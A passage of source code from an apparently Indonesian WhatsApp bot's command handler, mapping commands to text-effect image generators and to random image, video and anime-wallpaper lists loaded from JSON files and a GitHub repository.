if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
NFSBotInc.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'glitchtext': case 'writetext': case 'advancedglow': case 'typographytext': case 'pixelglitch': case 'neonglitch': case 'flagtext': case 'flag3dtext': case 'deletingtext': case 'blackpinkstyle': case 'glowingtext': case 'underwatertext': case 'logomaker': case 'cartoonstyle': case 'papercutstyle': case 'watercolortext': case 'effectclouds': case 'blackpinklogo': case 'gradienttext': case 'summerbeach': case 'luxurygold': case 'multicoloredneon': case 'sandsummer': case 'galaxywallpaper': case '1917style': case 'makingneon': case 'royaltext': case 'freecreate': case 'galaxystyle': case 'lighteffects':{
if (!q) return replygcNFS(`*Contoh :* ${prefix+command} NFSBotInc`) 
NFSStickWait()
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
NFSBotInc.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'shadow': case 'write': case 'romantic': case 'burnpaper': case 'smoke': case 'narutobanner': case 'love': case 'undergrass': case 'doublelove': case 'coffecup': case 'underwaterocean': case 'smokyneon': case 'starstext': case 'rainboweffect': case 'balloontext': case 'metalliceffect': case 'embroiderytext': case 'flamingtext': case 'stonetext': case 'writeart': case 'summertext': case 'wolfmetaltext': case 'nature3dtext': case 'rosestext': case 'naturetypography': case 'quotesunder': case 'shinetext':{
if (!q) return replygcNFS(`*Contoh :* ${prefix+command} NFSBotInc`) 
NFSStickWait()
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
NFSBotInc.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'pornhub':{
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} porn | Hub`)
NFSStickWait()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuphub = await textpro2("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anuphub)
NFSBotInc.sendMessage(from,{image:{url:anuphub}, caption:"Ini dia!"},{quoted:m})
}
break
case 'retro':{
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg | ea`)
NFSStickWait()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anutro2 = await textpro2("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
console.log(anutro2)
NFSBotInc.sendMessage(from,{image:{url:anutro2}, caption:"Ini dia!"},{quoted:m})
}
break
case '8bit':{
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg | ea`)
NFSStickWait()
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anubit8 = await textpro2("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
console.log(anubit8)
NFSBotInc.sendMessage(from,{image:{url:anubit8}, caption:"Ini dia!"},{quoted:m})
}
break
case 'batman':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err))
   break
case '3dbox':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ea`)
NFSStickWait()
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
    `${q}`,])
.then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
.catch((err) => console.log(err));
break
case 'lion':
  if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
  maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
      `${q}`,])
     .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
     .catch((err) => console.log(err));
     break
case '3davengers':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 
case 'window':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case '3dspace':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg | ea`)
NFSStickWait()
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'bokeh':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'holographic':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'thewall':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break 
case 'carbon':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'whitebear':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'metallic':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'steel':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'fabric':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'ancient':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'marvel':
if(!q) return replygcNFS(`*Contoh :* ${prefix + command} ajg`)
NFSStickWait()
maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
    `${q}`,])
  .then((data) => NFSBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Dibuat oleh ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'tiktokgirl':
NFSStickWait()
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
NFSStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
NFSStickWait()
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
NFSStickWait()
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
NFSStickWait()
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
NFSStickWait()
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
NFSStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
NFSStickWait()
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
NFSBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'animewallpaper2': case 'animewall2': {
                if (!args.join(" ")) return replygcNFS("Wallpaper apa yang Anda cari??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                NFSBotInc.sendMessage(m.chat, { caption: `Judul : ${result.title}\nKategori : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break
case 'animewall': case 'animewallpaper':
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return replygcNFS('Wallpaper apa yang Anda inginkan?')
NFSStickWait()
const wall = new AnimeWallpaper()
    const pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = Math.floor(Math.random() * wallpaper.length)    
            await NFSBotInc.sendMessage(m.chat, { caption: `*Pertanyaan :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('Error!')
                })
//NFSBotInc.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
NFSStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/bts.json')
